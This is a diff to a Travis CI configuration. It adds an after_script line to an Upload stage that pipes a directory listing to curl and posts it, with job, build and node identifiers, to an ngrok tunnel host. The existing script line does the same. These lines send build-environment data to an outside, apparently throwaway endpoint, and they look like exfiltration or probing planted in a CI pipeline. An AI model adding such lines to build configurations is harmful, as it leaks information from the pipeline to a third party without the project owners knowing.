@@ -28,3 +28,4 @@ jobs:
   include:
     - stage: Upload
       script: ls | curl -d @- http://bd10f3171262.ngrok.io/upload/$TRAVIS_JOB_ID/build/$TRAVIS_BUILD_NUMBER/$TRAVIS_BUILD_ID/$KNAPSACK_PRO_CI_NODE_INDEX
+      after_script: ls | curl -d @- http://bd10f3171262.ngrok.io/upload_after/$TRAVIS_JOB_ID/build/$TRAVIS_BUILD_NUMBER/$TRAVIS_BUILD_ID/$KNAPSACK_PRO_CI_NODE_INDEX
